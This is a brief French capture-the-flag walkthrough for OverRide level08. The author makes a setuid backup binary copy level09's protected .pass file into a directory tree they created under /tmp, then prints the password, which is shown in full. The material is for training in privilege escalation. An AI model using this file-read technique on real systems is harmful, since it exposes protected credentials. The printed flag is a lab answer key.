dans cet exercice on remarque sur dogbolt que level8 ouvre un fichier et ecrit son contenu dans le meme path dans un directory appele backups
on regarde la permission du fichier on remarque qu'il a les droit du level 9 on va donc essayer de l'ouvrir :

```
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```
on va donc essayer d'effectuer la commande dans tmp avec les directory cree
```

level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ ls
level08@OverRide:/tmp$ ~/level08 ../home/users/level09/.pass
ERROR: Failed to open ./backups/.log
level08@OverRide:/tmp$ mkdir backups
level08@OverRide:/tmp$ ./level08 /home/users/level09/.pass
-bash: ./level08: No such file or directory
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
level08@OverRide:/tmp$ mkdir backups/home
level08@OverRide:/tmp$ mkdir backups/home/users
level08@OverRide:/tmp$ mkdir backups/home/users/level09
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
level08@OverRide:/tmp$ cat backups/
home/ .log  
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S

```
